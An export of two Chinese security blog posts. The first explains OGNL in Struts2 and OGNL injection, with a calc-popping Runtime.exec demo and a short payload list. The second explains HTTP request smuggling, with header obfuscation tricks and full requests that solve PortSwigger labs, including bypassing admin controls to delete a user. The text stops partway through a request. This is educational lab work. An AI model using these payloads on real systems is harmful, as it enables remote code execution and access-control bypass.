OGNL三要素OGNL具有三要素：表达式（expression）、根对象（root）和上下文对象（context）。 表达式（expression）：表达式是整个OGNL的核心，通过表达式来告诉OGNL需要执行什么操作； 根对象（root）：root可以理解为OGNL的操作对象，OGNL可以对root进行取值或写值等操作，表达式规定了“做什么”，而根对象则规定了“对谁操作”。实际上根对象所在的环境就是 OGNL 的上下文对象环境； 上下文对象（context）：context可以理解为对象运行的上下文环境，context以MAP的结构、利用键值对关系来描述对象中的属性以及值； 这样不难知道，OGNL的context是包含root的。 Struts2中的ActionContext即为OGNL的context（又称context map），其中包含的ValueStack即为OGNL的root。该ActionContext包含的对象如图： ActionContextActionContext是上下文对象，对应OGNL的context，是一个以MAP为结构、利用键值对关系来描述对象中的属性以及值的对象，简单来说可以理解为一个action的小型数据库，整个action生命周期（线程）中所使用的数据都在这个ActionContext中。 借网上的一个图看下ActionContext中包含哪些东西： 除了三个常见的作用域request、session、application外，还有以下三个作用域： attr：保存着上面三个作用域的所有属性，如果有重复的则以request域中的属性为基准； paramters：保存的是表单提交的参数； VALUE_STACK：值栈，保存着valueStack对象，也就是说可以通过ActionContext访问到valueStack中的值； ValueStack值栈（ValueStack）就是OGNL表达式存取数据的地方。在一个值栈中，封装了一次请求所需要的所有数据。 在使用Struts2的项目中，Struts2会为每个请求创建一个新的值栈，也就是说，值栈和请求是一一对应的关系，这种一一对应的关系使值栈能够线程安全地为每个请求提供公共的数据存取服务。 值栈的作用值栈可以作为一个数据中转站在前台与后台之间传递数据，最常见的就是将Struts2的标签与OGNL表达式结合使用。值栈实际上是一个接口，在Struts2中利用OGNL时，实际上使用的就是实现了该接口的OgnlValueStack类，这个类是OGNL的基础。 值栈贯穿整个Action的生命周期，每个Action类的对象实例都拥有一个ValueStack对象，在ValueStack对象中保存了当前Action对象和其他相关对象。 要获取值栈中存储的数据，首先应该获取值栈。值栈的获取有两种方式，具体如下。 在request中获取值栈ValueStack对象在request范围内的存储方式为request.setAttribute(&quot;struts.valueStack&quot;,valuestack)，可以通过如下方式从request中取出值栈的信息。 123//获取 ValueStack 对象，通过 request 对象获取ValueStack valueStack = (ValueStack)ServletActionContext.getRequest() .getAttribute(ServletActionContext.STRUTS_VALUESTACK_KEY); 在上述示例代码中，ServletActionContext.STRUTS_VALUESTACK_KEY是ServletActionContext类中的常量，它的值为struts.valueStack。 在ActionContext中获取值栈在使用Struts2框架时，可以使用OGNL操作Context对象从ValueStack中存取数据，也就是说，可以从Context对象中获取ValueStack对象。实际上，Struts2框架中的Context对象就是ActionContext。 ActionContext获取ValueStack对象的方式如下所示： 12//通过 ActionContext 获取 valueStack 对象ValueStack valueStack = ActionContext.getContext().getValueStack(); ActionContext对象是在StrutsPrepareAndExcuteFilter的doFilter()方法中被创建的，在源码中用于创建ActionContext对象的createActionContext()方法内可以找到获取的ValueStack对象的信息。 方法中还有这样一段代码： 1ctx = new ActionContext(stack.getContext()); 从上述代码中可以看出，ValueStack对象中的Context对象被作为参数传递给了ActionContext对象，这也就说明ActionContext对象中持有了ValueStack对象的引用，因此可以通过ActionContext对象获取ValueStack对象。 OGNL基本语法OGNL支持各种纷繁复杂的表达式。但是最最基本的表达式的原型，是将对象的引用值用点串联起来，从左到右，每一次表达式计算返回的结果成为当前对象，后面部分接着在当前对象上进行计算，一直到全部表达式计算完成，返回最后得到的对象。OGNL则针对这条基本原则进行不断的扩充，从而使之支持对象树、数组、容器的访问，甚至是类似SQL中的投影选择等操作。 基本对象树的访问对象树的访问就是通过使用点号将对象的引用串联起来进行。例如： 123xxxxxxxx.xxxxxxxx.xxxx.xxxx.xxxx.xxxx 对容器变量的访问对容器变量的访问，通过#符号加上表达式进行。例如： 123#xxxx#xxxx.xxxx#xxxx.xxxxx.xxxx.xxxx.xxxx 使用操作符号OGNL表达式中能使用的操作符基本跟Java里的操作符一样，除了能使用+, -, *, /, ++, --, ==, !=, =等操作符之外，还能使用mod, in, not in等。 容器、数组、对象OGNL支持对数组和ArrayList等容器的顺序访问。例如：group.users[0] 同时，OGNL支持对Map的按键值查找。例如：#session[&#39;mySessionPropKey&#39;] 不仅如此，OGNL还支持容器的构造的表达式。例如：{&quot;green&quot;, &quot;red&quot;, &quot;blue&quot;}构造一个List，#{&quot;key1&quot; : &quot;value1&quot;, &quot;key2&quot; : &quot;value2&quot;, &quot;key3&quot; : &quot;value3&quot;}构造一个Map 你也可以通过任意类对象的构造函数进行对象新建。例如：new Java.net.URL(&quot;xxxxxx/&quot;) 对静态方法或变量的访问要引用类的静态方法和字段，他们的表达方式是一样的@class@member或者@class@method(args)。 例如：@com.javaeye.core.Resource@ENABLE，@com.javaeye.core.Resource@getAllResources 方法调用直接通过类似Java的方法调用方式进行，你甚至可以传递参数。 例如：user.getName()，group.users.size()，group.containsUser(#requestUser) 投影和选择OGNL支持类似数据库中的投影（projection） 和选择（selection）。 投影就是选出集合中每个元素的相同属性组成新的集合，类似于关系数据库的字段操作。投影操作语法为 collection.{XXX}，其中XXX是这个集合中每个元素的公共属性。 例如：group.userList.{username}将获得某个group中的所有user的name的列表。 选择就是过滤满足selection条件的集合元素，类似于关系数据库的纪录操作。选择操作的语法为：collection.{X YYY}，其中X是一个选择操作符，后面则是选择用的逻辑表达式。而选择操作符有三种： ?选择满足条件的所有元素 ^选择满足条件的第一个元素 $选择满足条件的最后一个元素 例如：group.userList.{? #txxx.xxx != null}将获得某个group中user的name不为空的user的列表。 OGNL语法树OGNL语法树有两种形式： (expression)(constant) = value (constant)((expression1)(expression2)) 每个括号对应语法树上的一个分支，并且从最右边的叶子节点开始解析执行。 关于”.”符号所有的OGNL表达式都基于当前对象的上下文来完成求值运算，链的前面部分的结果将作为后面求值的上下文。 如： 1name.toCharArray()[0].numbericValue.toString() 提取根(root)对象的name属性 调用上一步返回的结果字符串的toCharArray()方法 提取返回结果数组的第一个字符 获取字符的numbericValue属性，该字符是一个Character对象，Character类有个getNumeericValue()方法 调用结果Integer对象的toString()方法 # 和 % 和 $ 的区别#符#符主要有三种用途： 访问非根对象属性，即访问OGNL上下文和Action上下文，由于Struts2中值栈被视为根对象，所以访问其他非根对象时需要加#前缀，#相当于ActionContext.getContext()； 用于过滤和投影（projecting）集合，如books.{? #this.price&lt;100}； 用于构造Map，如#{&#39;foo1&#39;:&#39;bar1&#39;, &#39;foo2&#39;:&#39;bar2&#39;}； %符%符的用途是在标志的属性为字符串类型时，告诉执行环境%{}里的是OGNL表达式并计算表达式的值。 $符$符的主要作用是在相关配置文件中引入OGNL表达式，让其在配置文件中也能解析OGNL表达式。（换句话说，$用于在配置文件中获取ValueStack的值用的）。 # 和 . 和 @ 的区别 获取静态函数和变量的时候用@ 获取非静态函数用.号获取 获取非静态变量用#获取 基本用法Demo依赖的jar包：ognl-2.6.11.jar 示例代码1，基本的调用执行OGNL表达式： 123456789101112import ognl.Ognl;import ognl.OgnlContext;public class Test &#123; public static void main(String[] args) throws Exception &#123; String str = \"1+2\"; OgnlContext context = new OgnlContext(); Object ognl = Ognl.parseExpression(str); Object value = Ognl.getValue(ognl,context,context.getRoot()); System.out.println(\"result:\" + value); &#125;&#125; 运行即可输出result:3。 示例代码2，使用#符号从上下文获取变量值： 123456789101112131415import ognl.Ognl;import ognl.OgnlContext;public class Test &#123; public static void main(String[] args) throws Exception &#123; User user = new User(); user.setName(\"mi1k7ea\"); OgnlContext context = new OgnlContext(); context.put(\"user\",user); String str = \"#user.name\"; Object ognl = Ognl.parseExpression(str); Object value = Ognl.getValue(ognl,context,context.getRoot()); System.out.println(\"result:\" + value); &#125;&#125; 运行输出result:mi1k7ea。 OGNL与EL的区别因为OGNL表达式是Struts2的默认表达式语言，所以只针对Struts2标签有效；然而EL在HTML中也可以使用。 Struts2标签用的都是OGNL表达式语言，所以它多数都是去值栈的栈顶找值，找不到再去作用域；相反，EL都是去Map集合作用域中找。 页面取值区别如下表： 名称 servlet OGNL EL parameters request.getParameter(“username”) #username ${username} request request.getAttribute(“userName”) #request.userName ${requestScope.username} session session.getAttribute(“userName”) #session.userName ${sessionScope.username} application application.getAttribute(“userName”) #application.userName ${applicationScope.username} attr 用于按request &gt; session &gt; application顺序访问其属性（attribute） #attr.userName相当于按顺序在以上三个范围（scope）内读取userName属性，直到找到为止 0x02 能解析OGNL的API能解析OGNL的API如下表： 类名 方法名 com.opensymphony.xwork2.util.TextParseUtil translateVariables,translateVariablesCollection com.opensymphony.xwork2.util.TextParser evaluate com.opensymphony.xwork2.util.OgnlTextParser evaluate com.opensymphony.xwork2.ognl.OgnlUtil setProperties,setProperty,setValue,getValue,callMethod,compile org.apache.struts2.util.VelocityStrutsUtil evaluate org.apache.struts2.util.StrutsUtil isTrue,findString,findValue,getText,translateVariables,makeSelectList org.apache.struts2.views.jsp.ui.OgnlTool findValue com.opensymphony.xwork2.util.ValueStack findString,findValue,setValue,setParameter com.opensymphony.xwork2.ognl.OgnlValueStack findString,findValue,setValue,setParameter,trySetValue ognl.Ognl parseExpression,getValue,setValue 以下是调用过程中可能会涉及到的一些类： 涉及类名 方法名 com.opensymphony.xwork2.ognl.OgnlReflectionProvider getGetMethod,getSetMethod,getField,setProperties,setProperty,getValue,setValue com.opensymphony.xwork2.util.reflection.ReflectionProvider getGetMethod,getSetMethod,getField,setProperties,setProperty,getValue,setValue 0x03 OGNL表达式注入漏洞漏洞原理由前面知道，OGNL可以访问静态方法、属性以及对象方法等，其中包含可以执行恶意操作如命令执行的类java.lang.Runtime等，当OGNL表达式外部可控时，攻击者就可以构造恶意的OGNL表达式来让程序执行恶意操作，这就是OGNL表达式注入漏洞。 最简单的弹计算器的Demo： 12345678910111213141516import ognl.Ognl;import ognl.OgnlContext;public class Test &#123; public static void main(String[] args) throws Exception &#123; // 创建一个OGNL上下文对象 OgnlContext context = new OgnlContext(); // getValue()触发 // @[类全名(包括包路径)]@[方法名|值名] Ognl.getValue(\"@java.lang.Runtime@getRuntime().exec('calc')\", context, context.getRoot()); // setValue()触发// Ognl.setValue(Runtime.getRuntime().exec(\"calc\"), context, context.getRoot()); &#125;&#125; getValue()和setValue()都能成功解析恶意的OGNL表达式、触发弹计算器： 调试分析这里简单调试分析下Ognl.getValue()解析OGNL表达式到执行命令的过程。 在前面的Ognl.getValue代码处打下断点，往下调试，看到调用了parseExpression()函数，该函数将传入的String类型的字符串解析为OGNL表达式能理解的ASTChain类型： 往下，将传入的ASTChain类型的tree参数转换成Node类型（ASTChain继承自SimpleNode、SimpleNode继承自Node）再调用其getValue()函数继续解析： 由于tree变量就是表达式解析来的东西，因此接下来的调用中局部环境中的this变量的值就是我们的OGNL表达式的内容。往下就是调用的SimpleNode.getValue()函数，其中调用了evaluateGetValueBody()函数： evaluateGetValueBody()函数，顾名思义，用于计算getValue体中OGNL表达式的值。跟进看是直接调用了getValueBody()函数： 跟下去，就是调用的ASTChain.getValueBody()函数，这里会循环解析ASTChain中每个节点的表达式，这里有两个子节点，首先会解析第一个节点即`@java.lang.Runtime@getRuntime()`这个OGNL表达式： 跟进第一个子节点的解析过程，在ASTStaticMethod.getValueBody()函数中调用了OgnlRuntime.callStaticMethod()方法，其中已经将第一个子节点的表达式中的类和方法分别提取出来了： 跟进去，其中调用了classForName()函数来根据className参数寻找到java.lang.Runtime类，再往下解析： 往下，调用OgnlRuntime.getMethods()函数获取到java.lang.Runtime类的getRuntime()方法后，进一步调用OgnlRuntime.callAppropriateMethod()函数进行解析： 跟进OgnlRuntime.callAppropriateMethod()函数中，这里就是通过调用invokeMethod()函数来实现OGNL表达式中的类方法的调用： 跟进它的invokeMethod()函数，看到是Method.invoke()即通过反射机制实现java.lang.Runtime.getRuntime()方法的调用： 当然这里只是ASTChain的第一个子节点，该类方法执行完还没弹计算器，关键还要解析完ASTChain的第二个子节点、形成解析OGNL表达式节点链来实现完整的类方法调用。 接着调试，我们会返回到ASTChain.getValueBody()函数的for循环中继续循坏遍历解析第二个子节点，可以看到此时第二个子节点的OGNL表达式内容为exec(&quot;calc&quot;)： 后面的解析过程和解析第一个子节点的时候几乎是一样的。在调用OgnlRuntime.callMethod()函数时，参数source为前面解析第一个子节点表达式时得到的Runtime类，另外两个参数则为分辨出的方法名和参数值： 往下，解析得到具体的类方法exec()： 往下，就是反射调用Runtime.exec()函数实现任意类方法调用来谈计算器了： 此时函数调用栈如下： 1234567891011121314invokeMethod:518, OgnlRuntime (ognl)callAppropriateMethod:812, OgnlRuntime (ognl)callMethod:61, ObjectMethodAccessor (ognl)callMethod:846, OgnlRuntime (ognl)getValueBody:73, ASTMethod (ognl)evaluateGetValueBody:170, SimpleNode (ognl)getValue:210, SimpleNode (ognl)getValueBody:109, ASTChain (ognl)evaluateGetValueBody:170, SimpleNode (ognl)getValue:210, SimpleNode (ognl)getValue:333, Ognl (ognl)getValue:378, Ognl (ognl)getValue:357, Ognl (ognl)main:11, Test 简单地说，OGNL表达式的getValue()解析过程就是先将整个OGNL表达式按照语法树分为几个子节点树，然后循环遍历解析各个子节点树上的OGNL表达式，其中通过Method.invoke()即反射的方式实现任意类方法调用，将各个节点解析获取到的类方法通过ASTChain链的方式串连起来实现完整的表达式解析、得到完整的类方法调用。 HTTP请求中常见的注入点HTTP请求中常见的注入点如下表（来自Struts2著名RCE漏洞引发的十年之思）： 常用payload12345678910111213//获取context里面的变量 #user #user.name//使用runtime执行系统命令@java.lang.Runtime@getRuntime().exec(&quot;calc&quot;)//使用processbuilder执行系统命令(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;calc&quot;&#125;)).start()//获取当前路径@java.lang.System@getProperty(&quot;user.dir&quot;) 0x04 Struts2中OGNL执行过程分析有时间再调试分析，可参考：浅析 OGNL 的攻防史 0x05 OGNL攻防史有时间再详细分析，可参考：浅析 OGNL 的攻防史 0x06 参考OGNL OGNL表达式注入分析/) 浅析 OGNL 的攻防史","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"OGNL注入","slug":"OGNL注入","permalink":"https://www.mi1k7ea.com/tags/OGNL注入/"}]},{"title":"浅析HRS漏洞","date":"2020-03-11T15:59:05.000Z","path":"2020/03/11/浅析HRS漏洞/","text":"0x00 参考主要参考：HTTP Desync Attacks: Request Smuggling Reborn 实验环境：HTTP request smuggling BurpSuite插件http-request-smuggler：https://github.com/portswigger/http-request-smuggler 推荐一些深入浅出的好文： 一篇文章带你读懂 HTTP Smuggling 攻击 协议层的攻击——HTTP请求走私 HRS扫描原理及实现： 流量夹带(HTTP Request Smuggling) 检测方案的实现 0x01 HRS简介HRS全称Http Request Smuggling即HTTP请求走私。HTTP请求走私是一种干扰网站处理从一个或多个用户接收的HTTP请求序列的方式的技术，其允许攻击者绕过安全控制，获得对敏感数据的未经授权的访问，并直接危害其他应用程序用户。此外，还可以结合XSS、Web缓存中毒等深入利用。 HRS最早于2005年就被发现了，但因利用方式和危害影响所限被一直忽视。直至最近几年因为重视敏感信息的窃取以及利用新方法的提出才被重新提及。 0x02 漏洞原理简单地说，HRS漏洞的根源在于前端服务器和后端服务器对HTTP请求解析存在二义性。 漏洞场景 当今的Web应用程序经常在用户和最终应用程序逻辑之间使用HTTP服务器链，即用户将请求发送到前端服务器（有时称为负载均衡器或反向代理），此服务器将请求转发给一个或多个后端服务器。 当前端服务器将HTTP请求转发到后端服务器时，通常会通过相同的后端网络连接发送多个请求，因为这样做的效率和性能要高得多。协议非常简单：一个接一个地发送HTTP请求，接收服务器解析HTTP请求头，以确定一个请求的结束位置和下一个请求开始的位置： 在这种情况下，前端和后端服务器必须就请求之间的边界达成一致。否则，攻击者可能会发送由前端服务器和后端服务器不同解释的模糊请求： 在这里，攻击者将其前端请求的一部分由后端服务器解释为下一个请求的开始。它有效地优先于下一个请求，因此可能会干扰应用程序处理该请求的方式。这是一次请求走私攻击，可能会造成毁灭性的后果。 两个HTTP头字段大多数HRS漏洞的出现是因为HTTP规范提供了两种不同的方法来指定请求的结束位置： Content-Length（后面简称CL） Transfer-Encoding（后面简称TE） CL头很常见，它指定消息体的长度（以字节为单位），比如： 123456POST /search HTTP/1.1Host: normal-website.comContent-Type: application/x-www-form-urlencodedContent-Length: 11q=smuggling TE头即传输编码标头，用于指定消息主体使用分组编码。这意味着消息体包含一个或多个数据块。每个块包含以字节为单位的块大小（以十六进制表示），后面是换行符，后面是块内容。消息以0大小的块结束。 chunk传输数据格式如下，其中size的值由16进制表示： 1[chunk size][\\r\\n][chunk data][\\r\\n][chunk size][\\r\\n][chunk data][\\r\\n][chunk size = 0][\\r\\n][\\r\\n] 例如： 12345678POST /search HTTP/1.1Host: normal-website.comContent-Type: application/x-www-form-urlencodedTransfer-Encoding: chunkedbq=smuggling0 注意：许多安全测试人员不知道可以在HTTP请求中使用TE的原因有二： BurpSuite自动解压分组编码，使消息更易于查看和编辑； 浏览器通常不会在请求中使用TE，而且通常只在服务器响应中看到； 二义性造就HRS如果一个HTTP请求包含了两个标注请求结束位置不一致的头字段会怎么样呢？ 假设前端优先考虑第一个CL，后端优先考虑第二个CL。从后端角度看，TCP的流程可能是以下这样的： 在这个例子中，注入的“G”将攻击绿色用户的请求，他们可能会得到类似于“Unknown method GPOST”的响应。这就是因为前后端服务器对于HTTP请求的结束位置头字段解析的二义性导致的HRS问题。 而在现实中，双CL很少被使用，因为许多系统会明确地拒绝具有多个CL的请求。相反，我们将使用TE攻击系统，不过前提是使用RFC 2616规范。TE是HTTP1.1协议中定义的Web用户向服务器提交数据的一种方法，当服务器收到chunked编码方式的数据时会分配一个缓冲区存放之，如果提交的数据大小未知，客户端会以一个协商好的分块大小向服务器提交数据。 如果接收到的消息同时具有TE头字段和CL头字段，则必须忽略CL头字段。由于RFC 2616规范默许可以使用Transfer-Encoding: chunked和Content-Length处理请求，因此很少有服务器拒绝此类请求。 比如前端服务器支持CL，后端服务器支持TE，发送如下请求： 由于前端服务器不支持TE而后端服务器支持，从而导致”G”注入到了绿色用户的请求，使得HRS攻击成功。 同理，前端服务器支持TE，后端服务器支持CL的例子如下，只需将两个头结束位置的设置颠倒一下即可： 0x03 漏洞类型CL.TECL.TE即前端服务器使用Content-Length头，后端服务器是使用Transfer-Encoding头。 例子如下： 12345678POST / HTTP/1.1Host: vulnerable-website.comContent-Length: 13Transfer-Encoding: chunked0SMUGGLED 前端服务器处理CL头并确定请求正文长度为13字节，直到“SMUGGLED”结束，并将此请求转发到后端服务器。但后端服务器处理TE头，因此将消息体视为使用分块编码。它按序处理数据块，但第一个块就为0\\r\\n\\r\\n数据块，因此处理终止，后续消息体“SMUGGLED”将不会被执行处理，后端服务器将这些字节视为序列中下一个请求的开始。此时，如果前端服务器继续向后端服务器转发请求，那么后端服务器下一个接收到的请求就会是：SMUGGLED+POST=SMUGGLEDPOST的请求方法，这样，后端服务器会返回响应：Unknown method SMUGGLEDPOST。 TE.CLTE.CL即前端服务器使用Transfer-Encoding头，后端服务器是使用Content-Length头。 例子如下： 12345678POST / HTTP/1.1Host: vulnerable-website.comContent-Length: 3Transfer-Encoding: chunked8SMUGGLED0 这种情况下，前端服务器支持TE，会将消息体视为分块编码方式，它处理第一个长度为8字节的数据块，内容是SMUGGLED，之后解析处理第二个块，它是0长度，因此解析终止。该请求转发到后端服务器之后，由于后端服务器采用CL，按照其中请求主体长度的3个字节，解析会执行到8之后的行开头，所以SMUGGLED及以下的内容就不会被处理，侯丹服务器会将余下内容视为请求序列中下一个请求的起始。 注意：要使用BurpSuite的Repeater发送此请求，首先需要转到Reperter菜单中确保未选中“UpdateContent-Length”选项。此外，还需要包含尾随序列0后面的\\r\\n\\r\\n。 TE.TETE.TE即前端和后端服务器都支持采用Transfer-Encoding头，但其中一台服务器可以通过某种方式混淆报头，从而避免对其进行处理。从某种意义上还是CL.TE或TE.CL。 这里主要用到混淆TE头的技巧，包括但不限于如下： 123456789101112131415Transfer-Encoding: xchunkedTransfer-Encoding : chunkedTransfer-Encoding: chunkedTransfer-Encoding: xTransfer-Encoding:[tab]chunked[space]Transfer-Encoding: chunkedX: X[\\n]Transfer-Encoding: chunkedTransfer-Encoding: chunked 例子如下： 12345678910111213POST / HTTP/1.1Host: vulnerable-website.comContent-Length: 4Transfer-Encoding: chunkedTransfer-encoding: cow5cGPOST / HTTP/1.1Content-Type: application/x-www-form-urlencodedContent-Length: 15x=10 CL.CL在RFC7230的第3.3.3节中的第四条中，规定当服务器收到的请求中包含两个Content-Length，而且两者的值不同时，需要返回400错误。 就这种情况而言，一般都是无法利用了。但是总有服务器不会严格的实现该规范，假设前端服务器和后端服务器在收到类似的请求时，都不会返回400错误，但是前端服务器按照第一个CL的值对请求进行处理，而后端服务器按照第二个CL的值进行处理，这样同样存在HRS漏洞，如前面漏洞原理中讲到的例子： 但是这种情况极其少见。 0x04 漏洞案例与组合拳CL.TELab地址：https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te 题目要求：本实验涉及前端服务器和后端服务器，并且前端服务器不支持TE。前端服务器拒绝未使用GET或POST方法的请求。要解决此问题，请向后端服务器走私一个请求，以便后端服务器处理的下一个请求似乎使用GPOST方法。 构造报文如下： 123456789101112131415POST / HTTP/1.1Host: acf61f721e2f15be80da0791004a0040.web-security-academy.netUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Referer: https://portswigger.net/web-security/request-smuggling/lab-basic-cl-teConnection: closeUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 6Transfer-Encoding: chunked0G 发送两次即可成功得到GPOST错误响应： 这是因为前端服务器只认CL头，所以这个请求对于它来说是一个完整的请求，请求体的长度为6，也就是 1230\\r\\n\\r\\nG 当请求包经过前端服务器转发给后端服务器时，后端服务器只认TE头，当它读取到0\\r\\n\\r\\n时，认为已经读取到结尾了，但是剩下的字母G就被留在了缓冲区中，等待后续请求的到来。当我们重复发送请求后，发送的请求在后端服务器拼接成了类似下面这种请求，服务器在解析时当然会产生报错了： 123GPOST / HTTP/1.1\\r\\nHost: ace01fcf1fd05faf80c21f8b00ea006b.web-security-academy.net\\r\\n...... TE.CLLab地址：https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl 题目要求：本实验涉及前端服务器和后端服务器，后端服务器不支持TE。前端服务器拒绝未使用GET或POST方法的请求。要解决此问题，请向后端服务器走私一个请求，以便后端服务器处理的下一个请求似乎使用GPOST方法。 首先我们构造如下报文，注意0之后必须要有两个回车： 123456789101112131415POST / HTTP/1.1Host: ac9a1f2d1e1f8046806d5ca1003d009c.web-security-academy.netUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Referer: https://portswigger.net/web-security/request-smuggling/lab-basic-te-clConnection: closeUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 3Transfer-Encoding: chunked1G0 发送两次之后得到的是“G0POST”而非“GPOST”： 要达到题目要求，那么我们修改下请求，中间再夹杂一个报文请求即可： 12345678910111213141516POST / HTTP/1.1Host: ac9a1f2d1e1f8046806d5ca1003d009c.web-security-academy.netUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Referer: https://portswigger.net/web-security/request-smuggling/lab-basic-te-clConnection: closeUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 4Transfer-Encoding: chunked12GPOST / HTTP/1.10 注意，这里GPOST前面的12即是满足chunk格式的十六进制数，指明后面GPOST / HTTP/1.1\\r\\n的字节数即为0x12=18。 由于前端服务器处理TE头，当其读取到0\\r\\n\\r\\n时，认为是读取完毕了，此时这个请求对前端服务器来说是一个完整的请求，然后转发给后端服务器；后端服务器处理CL头，当它读取完12\\r\\n之后，就认为这个请求已经结束了，后面的数据就认为是另一个请求了，也就是： 1234GPOST / HTTP/1.1\\r\\n\\r\\n0\\r\\n\\r\\n 发送两次报文即可成功报错： TE.TELab地址：https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header 题目要求：本实验涉及一个前端和后端服务器，两个服务器以不同的方式处理重复的HTTP请求标头。前端服务器拒绝未使用GET或POST方法的请求。要解决此问题，请向后端服务器走私一个请求，以便后端服务器处理的下一个请求似乎使用GPOST方法。 构造报文如下，经过多种混淆TE头的测试，如下这种形式可行： 1234567891011121314151617POST / HTTP/1.1Host: ac201f121ec32767801f0d6a00ff0062.web-security-academy.netUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Referer: https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-headerConnection: closeUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 4Transfer-Encoding: chunkedTransfer-Encoding: x12GPOST / HTTP/1.10 这里混淆了TE头。前端服务器能够正常解析这个TE头，将0\\r\\n\\r\\n之前的内容都传递给后端服务器；而后端服务器并不能正常解析这个TE头，导致只能解析CL头获取得到请求体大小为4，即只获取了12\\r\\n的内容，而这之后的“GPOST”开头的内容则放到缓存中和下一个请求合并一起解析，从而成功导致GPOST请求失败。 发送两次报文即可成功报错： 绕过前端服务器的安全控制 在这个网络环境中，前端服务器负责实现安全控制，只有被允许的请求才能转发给后端服务器，而后端服务器无条件的相信前端服务器转发过来的全部请求，对每个请求都进行响应。因此我们可以利用HTTP请求走私，将无法访问的请求走私给后端服务器并获得响应。在这里有两个实验，分别是使用CL-TE和TE-CL绕过前端的访问控制。 CL.TE场景绕过Lab地址：https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te 题目要求：本实验涉及前端服务器和后端服务器，并且前端服务器不支持TE。在/admin处有一个管理面板，但是前端服务器阻止对该面板的访问。要解决此问题，请将请求走私到访问管理面板并删除后端服务器的carlos用户。 先直接用CL.TE的构造报文，改下请求/admin接口即可： 123456789101112131415POST / HTTP/1.1Host: aca61fa51f4feb1d80a80fd1006f007b.web-security-academy.netUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Referer: https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-teConnection: closeUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 28Transfer-Encoding: chunked0GET /admin HTTP/1.1 需要注意的一点是在这里，不需要我们对其他用户造成影响，因此走私过去的请求也必须是一个完整的请求，最后的两个\\r\\n不能丢弃。 发送两次，看到是向/admin接口访问了，但是返回说需要本地才能访问： 在前面构造的报文中添加Host: localhost头字段即可： 12345678910111213141516POST / HTTP/1.1Host: aca61fa51f4feb1d80a80fd1006f007b.web-security-academy.netUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Referer: https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-teConnection: closeUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 45Transfer-Encoding: chunked0GET /admin HTTP/1.1Host: localhost 发送两次，能成功访问/admin页面了，这里可看到carlos用户的信息及其删除的接口/admin/delete?username=carlos： 构造最终的报文访问该删除接口即可： 12345678910111213141516POST / HTTP/1.1Host: aca61fa51f4feb1d80a80fd1006f007b.web-security-academy.netUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Referer: https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-teConnection: closeUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 68Transfer-Encoding: chunked0GET /admin/delete?username=carlos HTTP/1.1Host: localhost 多发送几次，发现已经302了，此时是已经成功删除carlos用户的了： 此时重新登录再次查看，发现已经没有carlos用户了： TE.CL场景绕过Lab地址：https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl 题目要求：本实验涉及前端服务器和后端服务器，后端服务器不支持TE。在/admin处有一个管理面板，但是前端服务器阻止对该面板的访问。要解决此问题，请将请求走私到访问管理面板并删除后端服务器的carlos用户。 和前面类似，不再多说： 1234567891011121314151617POST / HTTP/1.1Host: aca31f051f556e6780403e2f00570083.web-security-academy.netUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; 